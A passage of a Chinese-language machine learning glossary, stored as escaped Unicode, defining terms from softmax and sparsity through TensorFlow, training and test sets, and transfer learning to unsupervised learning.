\u50cf\u7d20\u5448\u73b0\u7684\u732b\u56fe\u50cf\uff0c\u7b97\u6cd5\uff08\u6216\u4eba\uff09\u4e0d\u53ef\u80fd\u6b63\u786e\u5bf9\u5176\u8fdb\u884c\u5206\u7c7b\u3002 \u53e6\u8bf7\u53c2\u9605 \u5e73\u79fb\u4e0d\u53d8\u6027 \u548c \u65cb\u8f6c\u4e0d\u53d8\u6027 \u3002 19.10. softmax # \u4e00\u79cd\u51fd\u6570\uff0c\u53ef\u63d0\u4f9b \u591a\u7c7b\u522b\u5206\u7c7b\u6a21\u578b \u4e2d\u6bcf\u4e2a\u53ef\u80fd\u7c7b\u522b\u7684\u6982\u7387\u3002\u8fd9\u4e9b\u6982\u7387\u7684\u603b\u548c\u6b63\u597d\u4e3a 1.0\u3002\u4f8b\u5982\uff0csoftmax \u53ef\u80fd\u4f1a\u5f97\u51fa\u67d0\u4e2a\u56fe\u50cf\u662f\u72d7\u3001\u732b\u548c\u9a6c\u7684\u6982\u7387\u5206\u522b\u662f 0.9\u30010.08 \u548c 0.02\u3002\uff08\u4e5f\u79f0\u4e3a\u5b8c\u6574 softmax\u3002\uff09 \u4e0e \u5019\u9009\u91c7\u6837 \u76f8\u5bf9\u3002 19.11. \u7a00\u758f\u7279\u5f81 (sparse feature) # \u4e00\u79cd \u7279\u5f81 \u5411\u91cf\uff0c\u5176\u4e2d\u7684\u5927\u591a\u6570\u503c\u90fd\u4e3a 0 \u6216\u4e3a\u7a7a\u3002\u4f8b\u5982\uff0c\u67d0\u4e2a\u5411\u91cf\u5305\u542b\u4e00\u4e2a\u4e3a 1 \u7684\u503c\u548c\u4e00\u767e\u4e07\u4e2a\u4e3a 0 \u7684\u503c\uff0c\u5219\u8be5\u5411\u91cf\u5c31\u5c5e\u4e8e\u7a00\u758f\u5411\u91cf\u3002\u518d\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u641c\u7d22\u67e5\u8be2\u4e2d\u7684\u5355\u8bcd\u4e5f\u53ef\u80fd\u5c5e\u4e8e\u7a00\u758f\u7279\u5f81 - \u5728\u67d0\u79cd\u6307\u5b9a\u8bed\u8a00\u4e2d\u6709\u5f88\u591a\u53ef\u80fd\u7684\u5355\u8bcd\uff0c\u4f46\u5728\u67d0\u4e2a\u6307\u5b9a\u7684\u67e5\u8be2\u4e2d\u4ec5\u5305\u542b\u5176\u4e2d\u51e0\u4e2a\u3002 \u4e0e \u5bc6\u96c6\u7279\u5f81 \u76f8\u5bf9\u3002 19.12. \u7a00\u758f\u8868\u793a\u6cd5 (sparse representation) # \u4e00\u79cd\u5f20\u91cf \u8868\u793a\u6cd5 \uff0c\u4ec5\u5b58\u50a8\u975e\u96f6\u5143\u7d20\u3002 \u4f8b\u5982\uff0c\u82f1\u8bed\u4e2d\u5305\u542b\u7ea6\u4e00\u767e\u4e07\u4e2a\u5355\u8bcd\u3002\u8868\u793a\u4e00\u4e2a\u82f1\u8bed\u53e5\u5b50\u4e2d\u6240\u7528\u5355\u8bcd\u7684\u6570\u91cf\uff0c\u8003\u8651\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\uff1a \u8981\u91c7\u7528\u5bc6\u96c6\u8868\u793a\u6cd5\u6765\u8868\u793a\u6b64\u53e5\u5b50\uff0c\u5219\u5fc5\u987b\u4e3a\u6240\u6709\u4e00\u767e\u4e07\u4e2a\u5355\u5143\u683c\u8bbe\u7f6e\u4e00\u4e2a\u6574\u6570\uff0c\u7136\u540e\u5728\u5927\u90e8\u5206\u5355\u5143\u683c\u4e2d\u653e\u5165 0\uff0c\u5728\u5c11\u6570\u5355\u5143\u683c\u4e2d\u653e\u5165\u4e00\u4e2a\u975e\u5e38\u5c0f\u7684\u6574\u6570\u3002 \u8981\u91c7\u7528\u7a00\u758f\u8868\u793a\u6cd5\u6765\u8868\u793a\u6b64\u53e5\u5b50\uff0c\u5219\u4ec5\u5b58\u50a8\u8c61\u5f81\u53e5\u5b50\u4e2d\u5b9e\u9645\u5b58\u5728\u7684\u5355\u8bcd\u7684\u5355\u5143\u683c\u3002\u56e0\u6b64\uff0c\u5982\u679c\u53e5\u5b50\u53ea\u5305\u542b 20 \u4e2a\u72ec\u4e00\u65e0\u4e8c\u7684\u5355\u8bcd\uff0c\u90a3\u4e48\u8be5\u53e5\u5b50\u7684\u7a00\u758f\u8868\u793a\u6cd5\u5c06\u4ec5\u5728 20 \u4e2a\u5355\u5143\u683c\u4e2d\u5b58\u50a8\u4e00\u4e2a\u6574\u6570\u3002 \u4f8b\u5982\uff0c\u5047\u8bbe\u4ee5\u4e24\u79cd\u65b9\u5f0f\u6765\u8868\u793a\u53e5\u5b50\"Dogs wag tails.\"\u3002\u5982\u4e0b\u8868\u6240\u793a\uff0c\u5bc6\u96c6\u8868\u793a\u6cd5\u5c06\u4f7f\u7528\u7ea6\u4e00\u767e\u4e07\u4e2a\u5355\u5143\u683c\uff1b\u7a00\u758f\u8868\u793a\u6cd5\u5219\u53ea\u4f7f\u7528 3 \u4e2a\u5355\u5143\u683c\uff1a \\text{\u5bc6\u96c6\u8868\u793a\u6cd5} \u5355\u5143\u683c\u7f16\u53f7 \u5355\u8bcd \u51fa\u73b0\u6b21\u6570 0 a 0 1 aardvark 0 2 aargh 0 3 aarti 0 ... \u51fa\u73b0\u6b21\u6570\u4e3a 0 \u7684\u53e6\u5916 140391 \u4e2a\u5355\u8bcd 140395 dogs 1 ... \u51fa\u73b0\u6b21\u6570\u4e3a 0 \u7684 633062 \u4e2a\u5355\u8bcd 773458 tails 1 ... \u51fa\u73b0\u6b21\u6570\u4e3a 0 \u7684 189136 \u4e2a\u5355\u8bcd 962594 wag 1 ... \u51fa\u73b0\u6b21\u6570\u4e3a 0 \u7684\u5f88\u591a\u5176\u4ed6\u5355\u8bcd \\text{\u7a00\u758f\u8868\u793a\u6cd5} \u5355\u5143\u683c\u7f16\u53f7 \u5355\u8bcd \u51fa\u73b0\u6b21\u6570 140395 dogs 1 773458 tails 1 962594 wag 1 19.13. \u7a00\u758f\u6027 (sparsity) # \u5411\u91cf\u6216\u77e9\u9635\u4e2d\u8bbe\u7f6e\u4e3a 0\uff08\u6216\u7a7a\uff09\u7684\u5143\u7d20\u6570\u9664\u4ee5\u8be5\u5411\u91cf\u6216\u77e9\u9635\u4e2d\u7684\u6761\u76ee\u603b\u6570\u3002\u4ee5\u4e00\u4e2a 10x10 \u77e9\u9635\uff08\u5176\u4e2d 98 \u4e2a\u5355\u5143\u683c\u90fd\u5305\u542b 0\uff09\u4e3a\u4f8b\u3002\u7a00\u758f\u6027\u7684\u8ba1\u7b97\u65b9\u6cd5\u5982\u4e0b\uff1a \\text{\u7a00\u758f\u6027} = \\frac{98}{100} = 0.98 \u7279\u5f81\u7a00\u758f\u6027\u662f\u6307\u7279\u5f81\u5411\u91cf\u7684\u7a00\u758f\u6027\uff1b\u6a21\u578b\u7a00\u758f\u6027\u662f\u6307\u6a21\u578b\u6743\u91cd\u7684\u7a00\u758f\u6027\u3002 19.14. \u7a7a\u95f4\u6c60\u5316 (spatial pooling) # \u8bf7\u53c2\u9605 \u6c60\u5316 \u3002 19.15. \u5e73\u65b9\u5408\u9875\u635f\u5931\u51fd\u6570 (squared hinge loss) # \u5408\u9875\u635f\u5931\u51fd\u6570 \u7684\u5e73\u65b9\u3002\u4e0e\u5e38\u89c4\u5408\u9875\u635f\u5931\u51fd\u6570\u76f8\u6bd4\uff0c\u5e73\u65b9\u5408\u9875\u635f\u5931\u51fd\u6570\u5bf9\u79bb\u7fa4\u503c\u7684\u60e9\u7f5a\u66f4\u4e25\u5389\u3002 19.16. \u5e73\u65b9\u635f\u5931\u51fd\u6570 (squared loss) # \u5728 \u7ebf\u6027\u56de\u5f52 \u4e2d\u4f7f\u7528\u7684 \u635f\u5931 \u51fd\u6570\uff08\u4e5f\u79f0\u4e3a L_2 \u635f\u5931\u51fd\u6570\uff09\u3002\u8be5\u51fd\u6570\u53ef\u8ba1\u7b97\u6a21\u578b\u4e3a\u6709\u6807\u7b7e \u6837\u672c \u9884\u6d4b\u7684\u503c\u548c \u6807\u7b7e \u7684\u5b9e\u9645\u503c\u4e4b\u5dee\u7684\u5e73\u65b9\u3002\u7531\u4e8e\u53d6\u5e73\u65b9\u503c\uff0c\u56e0\u6b64\u8be5\u635f\u5931\u51fd\u6570\u4f1a\u653e\u5927\u4e0d\u4f73\u9884\u6d4b\u7684\u5f71\u54cd\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0e L_1 \u635f\u5931\u51fd\u6570 \u76f8\u6bd4\uff0c\u5e73\u65b9\u635f\u5931\u51fd\u6570\u5bf9\u79bb\u7fa4\u503c\u7684\u53cd\u5e94\u66f4\u5f3a\u70c8\u3002 19.17. \u9759\u6001\u6a21\u578b (static model) # \u79bb\u7ebf\u8bad\u7ec3\u7684\u4e00\u79cd\u6a21\u578b\u3002 19.18. \u5e73\u7a33\u6027 (stationarity) # \u6570\u636e\u96c6\u4e2d\u6570\u636e\u7684\u4e00\u79cd\u5c5e\u6027\uff0c\u8868\u793a\u6570\u636e\u5206\u5e03\u5728\u4e00\u4e2a\u6216\u591a\u4e2a\u7ef4\u5ea6\u4fdd\u6301\u4e0d\u53d8\u3002\u8fd9\u79cd\u7ef4\u5ea6\u6700\u5e38\u89c1\u7684\u662f\u65f6\u95f4\uff0c\u5373\u8868\u660e\u5e73\u7a33\u6027\u7684\u6570\u636e\u4e0d\u968f\u65f6\u95f4\u800c\u53d8\u5316\u3002\u4f8b\u5982\uff0c\u4ece 9 \u6708\u5230 12 \u6708\uff0c\u8868\u660e\u5e73\u7a33\u6027\u7684\u6570\u636e\u6ca1\u6709\u53d1\u751f\u53d8\u5316\u3002 19.19. \u6b65 (step) # \u5bf9\u4e00\u4e2a \u6279\u6b21 \u7684\u5411\u524d\u548c\u5411\u540e\u8bc4\u4f30\u3002 19.20. \u6b65\u957f (step size) # \u4e0e \u5b66\u4e60\u901f\u7387 \u7684\u542b\u4e49\u76f8\u540c\u3002 19.21. \u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5 (SGD, stochastic gradient descent) # \u6279\u6b21\u5927\u5c0f\u4e3a 1 \u7684\u4e00\u79cd \u68af\u5ea6\u4e0b\u964d\u6cd5 \u3002\u6362\u53e5\u8bdd\u8bf4\uff0cSGD \u4f9d\u8d56\u4e8e\u4ece\u6570\u636e\u96c6\u4e2d\u968f\u673a\u5747\u5300\u9009\u62e9\u7684\u5355\u4e2a\u6837\u672c\u6765\u8ba1\u7b97\u6bcf\u6b65\u7684\u68af\u5ea6\u4f30\u7b97\u503c\u3002 19.22. \u7ed3\u6784\u98ce\u9669\u6700\u5c0f\u5316 (SRM, structural risk minimization) # \u4e00\u79cd\u7b97\u6cd5\uff0c\u7528\u4e8e\u5e73\u8861\u4ee5\u4e0b\u4e24\u4e2a\u76ee\u6807\uff1a \u671f\u671b\u6784\u5efa\u6700\u5177\u9884\u6d4b\u6027\u7684\u6a21\u578b\uff08\u4f8b\u5982\u635f\u5931\u6700\u4f4e\uff09\u3002 \u671f\u671b\u4f7f\u6a21\u578b\u5c3d\u53ef\u80fd\u7b80\u5355\uff08\u4f8b\u5982\u5f3a\u5927\u7684\u6b63\u5219\u5316\uff09\u3002 \u4f8b\u5982\uff0c\u65e8\u5728\u5c06\u57fa\u4e8e\u8bad\u7ec3\u96c6\u7684\u635f\u5931\u548c\u6b63\u5219\u5316\u964d\u81f3\u6700\u4f4e\u7684\u51fd\u6570\u5c31\u662f\u4e00\u79cd\u7ed3\u6784\u98ce\u9669\u6700\u5c0f\u5316\u7b97\u6cd5\u3002 \u5982\u9700\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 http://www.svms.org/srm/ \u3002 \u4e0e \u7ecf\u9a8c\u98ce\u9669\u6700\u5c0f\u5316 \u76f8\u5bf9\u3002 19.23. \u6b65\u957f (stride) # \u5728\u5377\u79ef\u8fd0\u7b97\u6216\u6c60\u5316\u4e2d\uff0c\u4e0b\u4e00\u4e2a\u7cfb\u5217\u7684\u8f93\u5165\u5207\u7247\u7684\u6bcf\u4e2a\u7ef4\u5ea6\u4e2d\u7684\u589e\u91cf\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u52a8\u753b\u6f14\u793a\u4e86\u5377\u79ef\u8fd0\u7b97\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e2a (1,1) \u6b65\u957f\u3002\u56e0\u6b64\uff0c\u4e0b\u4e00\u4e2a\u8f93\u5165\u5207\u7247\u662f\u4ece\u4e0a\u4e00\u4e2a\u8f93\u5165\u5207\u7247\u5411\u53f3\u79fb\u52a8\u4e00\u4e2a\u6b65\u957f\u7684\u4f4d\u7f6e\u5f00\u59cb\u3002\u5f53\u8fd0\u7b97\u5230\u8fbe\u53f3\u4fa7\u8fb9\u7f18\u65f6\uff0c\u4e0b\u4e00\u4e2a\u5207\u7247\u5c06\u56de\u5230\u6700\u5de6\u8fb9\uff0c\u4f46\u662f\u4e0b\u79fb\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u524d\u9762\u7684\u793a\u4f8b\u6f14\u793a\u4e86\u4e00\u4e2a\u4e8c\u7ef4\u6b65\u957f\u3002\u5982\u679c\u8f93\u5165\u77e9\u9635\u4e3a\u4e09\u7ef4\uff0c\u90a3\u4e48\u6b65\u957f\u4e5f\u5c06\u662f\u4e09\u7ef4\u3002 19.24. \u4e0b\u91c7\u6837 (subsampling) # \u8bf7\u53c2\u9605 \u6c60\u5316 \u3002 19.25. \u603b\u7ed3 (summary) # \u5728 TensorFlow \u4e2d\u7684\u67d0\u4e00 \u6b65 \u8ba1\u7b97\u51fa\u7684\u4e00\u4e2a\u503c\u6216\u4e00\u7ec4\u503c\uff0c\u901a\u5e38\u7528\u4e8e\u5728\u8bad\u7ec3\u671f\u95f4\u8ddf\u8e2a\u6a21\u578b\u6307\u6807\u3002 19.26. \u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 (supervised machine learning) # \u6839\u636e\u8f93\u5165\u6570\u636e\u53ca\u5176\u5bf9\u5e94\u7684 \u6807\u7b7e \u6765\u8bad\u7ec3 \u6a21\u578b \u3002\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60\u7c7b\u4f3c\u4e8e\u5b66\u751f\u901a\u8fc7\u7814\u7a76\u4e00\u7cfb\u5217\u95ee\u9898\u53ca\u5176\u5bf9\u5e94\u7684\u7b54\u6848\u6765\u5b66\u4e60\u67d0\u4e2a\u4e3b\u9898\u3002\u5728\u638c\u63e1\u4e86\u95ee\u9898\u548c\u7b54\u6848\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\u540e\uff0c\u5b66\u751f\u4fbf\u53ef\u4ee5\u56de\u7b54\u5173\u4e8e\u540c\u4e00\u4e3b\u9898\u7684\u65b0\u95ee\u9898\uff08\u4ee5\u524d\u4ece\u672a\u89c1\u8fc7\u7684\u95ee\u9898\uff09\u3002\u8bf7\u4e0e \u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 \u8fdb\u884c\u6bd4\u8f83\u3002 19.27. \u5408\u6210\u7279\u5f81 (synthetic feature) # \u4e00\u79cd \u7279\u5f81 \uff0c\u4e0d\u5728\u8f93\u5165\u7279\u5f81\u4e4b\u5217\uff0c\u800c\u662f\u4ece\u4e00\u4e2a\u6216\u591a\u4e2a\u8f93\u5165\u7279\u5f81\u884d\u751f\u800c\u6765\u3002\u5408\u6210\u7279\u5f81\u5305\u62ec\u4ee5\u4e0b\u7c7b\u578b\uff1a \u5bf9\u8fde\u7eed\u7279\u5f81\u8fdb\u884c \u5206\u6876 \uff0c\u4ee5\u5206\u4e3a\u591a\u4e2a\u533a\u95f4\u5206\u7bb1\u3002 \u5c06\u4e00\u4e2a\u7279\u5f81\u503c\u4e0e\u5176\u4ed6\u7279\u5f81\u503c\u6216\u5176\u672c\u8eab\u76f8\u4e58\uff08\u6216\u76f8\u9664\uff09\u3002 \u521b\u5efa\u4e00\u4e2a \u7279\u5f81\u7ec4\u5408 \u3002 \u4ec5\u901a\u8fc7 \u6807\u51c6\u5316 \u6216 \u7f29\u653e \u521b\u5efa\u7684\u7279\u5f81\u4e0d\u5c5e\u4e8e\u5408\u6210\u7279\u5f81\u3002 20. T # 20.1. \u76ee\u6807 (target) # \u4e0e \u6807\u7b7e \u7684\u542b\u4e49\u76f8\u540c\u3002 20.2. \u65f6\u6001\u6570\u636e (temporal data) # \u5728\u4e0d\u540c\u65f6\u95f4\u70b9\u8bb0\u5f55\u7684\u6570\u636e\u3002\u4f8b\u5982\uff0c\u8bb0\u5f55\u7684\u4e00\u5e74\u4e2d\u6bcf\u4e00\u5929\u7684\u51ac\u5916\u5957\u9500\u91cf\u5c31\u5c5e\u4e8e\u65f6\u6001\u6570\u636e\u3002 20.3. \u5f20\u91cf (Tensor) # TensorFlow \u7a0b\u5e8f\u4e2d\u7684\u4e3b\u8981\u6570\u636e\u7ed3\u6784\u3002\u5f20\u91cf\u662f N \u7ef4\uff08\u5176\u4e2d N \u53ef\u80fd\u975e\u5e38\u5927\uff09\u6570\u636e\u7ed3\u6784\uff0c\u6700\u5e38\u89c1\u7684\u662f\u6807\u91cf\u3001\u5411\u91cf\u6216\u77e9\u9635\u3002\u5f20\u91cf\u7684\u5143\u7d20\u53ef\u4ee5\u5305\u542b\u6574\u6570\u503c\u3001\u6d6e\u70b9\u503c\u6216\u5b57\u7b26\u4e32\u503c\u3002 20.4. \u5f20\u91cf\u5904\u7406\u5355\u5143 (TPU, Tensor Processing Unit) # \u4e00\u79cd ASIC\uff08\u5e94\u7528\u4e13\u7528\u96c6\u6210\u7535\u8def\uff09\uff0c\u7528\u4e8e\u4f18\u5316 TensorFlow \u7a0b\u5e8f\u7684\u6027\u80fd\u3002 20.5. \u5f20\u91cf\u7b49\u7ea7 (Tensor rank) # \u8bf7\u53c2\u9605 \u7b49\u7ea7 \u3002 20.6. \u5f20\u91cf\u5f62\u72b6 (Tensor shape) # \u5f20\u91cf \u5728\u5404\u79cd\u7ef4\u5ea6\u4e2d\u5305\u542b\u7684\u5143\u7d20\u6570\u3002\u4f8b\u5982\uff0c\u5f20\u91cf [5, 10] \u5728\u4e00\u4e2a\u7ef4\u5ea6\u4e2d\u7684\u5f62\u72b6\u4e3a 5\uff0c\u5728\u53e6\u4e00\u4e2a\u7ef4\u5ea6\u4e2d\u7684\u5f62\u72b6\u4e3a 10\u3002 20.7. \u5f20\u91cf\u5927\u5c0f (Tensor size) # \u5f20\u91cf \u5305\u542b\u7684\u6807\u91cf\u603b\u6570\u3002\u4f8b\u5982\uff0c\u5f20\u91cf [5, 10] \u7684\u5927\u5c0f\u4e3a 50\u3002 20.8. TensorBoard # \u4e00\u4e2a\u4fe1\u606f\u4e2d\u5fc3\uff0c\u7528\u4e8e\u663e\u793a\u5728\u6267\u884c\u4e00\u4e2a\u6216\u591a\u4e2a TensorFlow \u7a0b\u5e8f\u671f\u95f4\u4fdd\u5b58\u7684\u6458\u8981\u4fe1\u606f\u3002 20.9. TensorFlow # \u4e00\u4e2a\u5927\u578b\u7684\u5206\u5e03\u5f0f\u673a\u5668\u5b66\u4e60\u5e73\u53f0\u3002\u8be5\u672f\u8bed\u8fd8\u6307 TensorFlow \u5806\u6808\u4e2d\u7684\u57fa\u672c API \u5c42\uff0c\u8be5\u5c42\u652f\u6301\u5bf9\u6570\u636e\u6d41\u56fe\u8fdb\u884c\u4e00\u822c\u8ba1\u7b97\u3002 \u867d\u7136 TensorFlow \u4e3b\u8981\u5e94\u7528\u4e8e\u673a\u5668\u5b66\u4e60\u9886\u57df\uff0c\u4f46\u4e5f\u53ef\u7528\u4e8e\u9700\u8981\u4f7f\u7528\u6570\u636e\u6d41\u56fe\u8fdb\u884c\u6570\u503c\u8ba1\u7b97\u7684\u975e\u673a\u5668\u5b66\u4e60\u4efb\u52a1\u3002 20.10. TensorFlow Playground # \u4e00\u6b3e\u7528\u4e8e\u76f4\u89c2\u5448\u73b0\u4e0d\u540c\u7684 \u8d85\u53c2\u6570 \u5bf9\u6a21\u578b\uff08\u4e3b\u8981\u662f\u795e\u7ecf\u7f51\u7edc\uff09\u8bad\u7ec3\u7684\u5f71\u54cd\u7684\u7a0b\u5e8f\u3002\u8981\u8bd5\u7528 TensorFlow Playground\uff0c\u8bf7\u524d\u5f80 http://playground.tensorflow.org \u3002 20.11. TensorFlow Serving # \u4e00\u4e2a\u5e73\u53f0\uff0c\u7528\u4e8e\u5c06\u8bad\u7ec3\u8fc7\u7684\u6a21\u578b\u90e8\u7f72\u5230\u751f\u4ea7\u73af\u5883\u3002 20.12. \u6d4b\u8bd5\u96c6 (test set) # \u6570\u636e\u96c6\u7684\u5b50\u96c6\uff0c\u7528\u4e8e\u5728 \u6a21\u578b \u7ecf\u7531\u9a8c\u8bc1\u96c6\u7684\u521d\u6b65\u9a8c\u8bc1\u4e4b\u540e\u6d4b\u8bd5\u6a21\u578b\u3002 \u4e0e \u8bad\u7ec3\u96c6 \u548c \u9a8c\u8bc1\u96c6 \u76f8\u5bf9\u3002 20.13. tf.Example # \u4e00\u79cd\u6807\u51c6 \u534f\u8bae\u7f13\u51b2\u533a \uff0c\u65e8\u5728\u63cf\u8ff0\u7528\u4e8e\u673a\u5668\u5b66\u4e60\u6a21\u578b\u8bad\u7ec3\u6216\u63a8\u65ad\u7684\u8f93\u5165\u6570\u636e\u3002 20.14. \u65f6\u95f4\u5e8f\u5217\u5206\u6790 (time series analysis) # \u673a\u5668\u5b66\u4e60\u548c\u7edf\u8ba1\u5b66\u7684\u4e00\u4e2a\u5b50\u9886\u57df\uff0c\u65e8\u5728\u5206\u6790 \u65f6\u6001\u6570\u636e \u3002\u5f88\u591a\u7c7b\u578b\u7684\u673a\u5668\u5b66\u4e60\u95ee\u9898\u90fd\u9700\u8981\u65f6\u95f4\u5e8f\u5217\u5206\u6790\uff0c\u5176\u4e2d\u5305\u62ec\u5206\u7c7b\u3001\u805a\u7c7b\u3001\u9884\u6d4b\u548c\u5f02\u5e38\u68c0\u6d4b\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u5229\u7528\u65f6\u95f4\u5e8f\u5217\u5206\u6790\u6839\u636e\u5386\u53f2\u9500\u91cf\u6570\u636e\u9884\u6d4b\u672a\u6765\u6bcf\u6708\u7684\u51ac\u5916\u5957\u9500\u91cf\u3002 20.15. \u8bad\u7ec3 (training) # \u786e\u5b9a\u6784\u6210\u6a21\u578b\u7684\u7406\u60f3 \u53c2\u6570 \u7684\u8fc7\u7a0b\u3002 20.16. \u8bad\u7ec3\u96c6 (training set) # \u6570\u636e\u96c6\u7684\u5b50\u96c6\uff0c\u7528\u4e8e\u8bad\u7ec3\u6a21\u578b\u3002 \u4e0e \u9a8c\u8bc1\u96c6 \u548c \u6d4b\u8bd5\u96c6 \u76f8\u5bf9\u3002 20.17. \u8fc1\u79fb\u5b66\u4e60 (transfer learning) # \u5c06\u4fe1\u606f\u4ece\u4e00\u4e2a\u673a\u5668\u5b66\u4e60\u4efb\u52a1\u8fc1\u79fb\u5230\u53e6\u4e00\u4e2a\u673a\u5668\u5b66\u4e60\u4efb\u52a1\u3002\u4f8b\u5982\uff0c\u5728\u591a\u4efb\u52a1\u5b66\u4e60\u4e2d\uff0c\u4e00\u4e2a\u6a21\u578b\u53ef\u4ee5\u5b8c\u6210\u591a\u9879\u4efb\u52a1\uff0c\u4f8b\u5982\u9488\u5bf9\u4e0d\u540c\u4efb\u52a1\u5177\u6709\u4e0d\u540c\u8f93\u51fa\u8282\u70b9\u7684 \u6df1\u5ea6\u6a21\u578b \u3002\u8fc1\u79fb\u5b66\u4e60\u53ef\u80fd\u6d89\u53ca\u5c06\u77e5\u8bc6\u4ece\u8f83\u7b80\u5355\u4efb\u52a1\u7684\u89e3\u51b3\u65b9\u6848\u8fc1\u79fb\u5230\u8f83\u590d\u6742\u7684\u4efb\u52a1\uff0c\u6216\u8005\u5c06\u77e5\u8bc6\u4ece\u6570\u636e\u8f83\u591a\u7684\u4efb\u52a1\u8fc1\u79fb\u5230\u6570\u636e\u8f83\u5c11\u7684\u4efb\u52a1\u3002 \u5927\u591a\u6570\u673a\u5668\u5b66\u4e60\u7cfb\u7edf\u90fd\u53ea\u80fd\u5b8c\u6210\u4e00\u9879\u4efb\u52a1\u3002\u8fc1\u79fb\u5b66\u4e60\u662f\u8fc8\u5411\u4eba\u5de5\u667a\u80fd\u7684\u4e00\u5c0f\u6b65\uff1b\u5728\u4eba\u5de5\u667a\u80fd\u4e2d\uff0c\u5355\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u5b8c\u6210\u591a\u9879\u4efb\u52a1\u3002 20.18. \u5e73\u79fb\u4e0d\u53d8\u6027 (translational invariance) # \u5728\u56fe\u50cf\u5206\u7c7b\u95ee\u9898\u4e2d\uff0c\u5373\u4f7f\u56fe\u50cf\u4e2d\u5bf9\u8c61\u7684\u4f4d\u7f6e\u53d1\u751f\u53d8\u5316\uff0c\u7b97\u6cd5\u4e5f\u80fd\u6210\u529f\u5bf9\u56fe\u50cf\u8fdb\u884c\u5206\u7c7b\u3002\u4f8b\u5982\uff0c\u65e0\u8bba\u4e00\u53ea\u72d7\u4f4d\u4e8e\u753b\u9762\u6b63\u4e2d\u592e\u8fd8\u662f\u753b\u9762\u5de6\u4fa7\uff0c\u8be5\u7b97\u6cd5\u4ecd\u7136\u53ef\u4ee5\u8bc6\u522b\u5b83\u3002 \u53e6\u8bf7\u53c2\u9605 \u5927\u5c0f\u4e0d\u53d8\u6027 \u548c \u65cb\u8f6c\u4e0d\u53d8\u6027 \u3002 20.19. \u8d1f\u4f8b (TN, true negative) # \u88ab\u6a21\u578b\u6b63\u786e\u5730\u9884\u6d4b\u4e3a \u8d1f\u7c7b\u522b \u7684\u6837\u672c\u3002\u4f8b\u5982\uff0c\u6a21\u578b\u63a8\u65ad\u51fa\u67d0\u5c01\u7535\u5b50\u90ae\u4ef6\u4e0d\u662f\u5783\u573e\u90ae\u4ef6\uff0c\u800c\u8be5\u7535\u5b50\u90ae\u4ef6\u786e\u5b9e\u4e0d\u662f\u5783\u573e\u90ae\u4ef6\u3002 20.20. \u6b63\u4f8b (TP, true positive) # \u88ab\u6a21\u578b\u6b63\u786e\u5730\u9884\u6d4b\u4e3a \u6b63\u7c7b\u522b \u7684\u6837\u672c\u3002\u4f8b\u5982\uff0c\u6a21\u578b\u63a8\u65ad\u51fa\u67d0\u5c01\u7535\u5b50\u90ae\u4ef6\u662f\u5783\u573e\u90ae\u4ef6\uff0c\u800c\u8be5\u7535\u5b50\u90ae\u4ef6\u786e\u5b9e\u662f\u5783\u573e\u90ae\u4ef6\u3002 20.21. \u6b63\u4f8b\u7387\uff08true positive rate, \u7b80\u79f0 TP \u7387\uff09 # \u4e0e \u53ec\u56de\u7387 \u7684\u542b\u4e49\u76f8\u540c\uff0c\u5373\uff1a \\text{\u6b63\u4f8b\u7387} = \\frac{\u6b63\u4f8b\u6570}{\u6b63\u4f8b\u6570 + \u5047\u8d1f\u4f8b\u6570} \u6b63\u4f8b\u7387\u662f ROC \u66f2\u7ebf \u7684 y \u8f74\u3002 21. U # 21.1. \u65e0\u6807\u7b7e\u6837\u672c (unlabeled example) # \u5305\u542b \u7279\u5f81 \u4f46\u6ca1\u6709 \u6807\u7b7e \u7684\u6837\u672c\u3002\u65e0\u6807\u7b7e\u6837\u672c\u662f\u7528\u4e8e\u8fdb\u884c \u63a8\u65ad \u7684\u8f93\u5165\u5185\u5bb9\u3002\u5728 \u534a\u76d1\u7763\u5f0f \u548c \u975e\u76d1\u7763\u5f0f \u5b66\u4e60\u4e2d\uff0c\u5728\u8bad\u7ec3\u671f\u95f4\u4f1a\u4f7f\u7528\u65e0\u6807\u7b7e\u6837\u672c\u3002 21.2. \u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 (unsupervised machine learning) # \u8bad\u7ec3 \u6a21\u578b \uff0c\u4ee5\u627e\u51fa\u6570\u636e\u96c6\uff08\u901a\u5e38\u662f\u65e0\u6807\u7b7e\u6570\u636e\u96c6\uff09\u4e2d\u7684\u89c4\u5f8b\u3002 \u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60\u6700\u5e38\u89c1\u7684\u7528\u9014\u662f\u5c06\u6570\u636e\u5206\u4e3a\u4e0d\u540c\u7684\u805a\u7c7b\uff0c\u4f7f\u76f8\u4f3c\u7684\u6837\u672c\u4f4d\u4e8e\u540c\u4e00\u7ec4\u4e2d\u3002\u4f8b\u5982\uff0c\u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u53ef\u4ee5\u6839\u636e\u97f3\u4e50\u7684\u5404\u79cd\u5c5e\u6027\u5c06\u6b4c\u66f2\u5206\u4e3a\u4e0d\u540c\u7684\u805a\u7c7b\u3002\u6240\u5f97\u805a\u7c7b\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\uff08\u4f8b\u5982\u97f3\u4e50\u63a8\u8350\u670d\u52a1\uff09\u7684\u8f93\u5165\u3002\u5728\u5f88\u96be\u83b7\u53d6\u771f\u6807\u7b7e\u7684\u9886\u57df\uff0c\u805a\u7c7b\u53ef\u80fd\u4f1a\u975e\u5e38\u6709\u7528\u3002\u4f8b\u5982\uff0c\u5728\u53cd\u6ee5\u7528\u548c\u53cd\u6b3a\u8bc8\u7b49\u9886\u57df\uff0c\u805a\u7c7b\u6709\u52a9\u4e8e\u4eba\u4eec\u66f4\u597d\u5730\u4e86\u89e3\u76f8\u5173\u6570\u636e\u3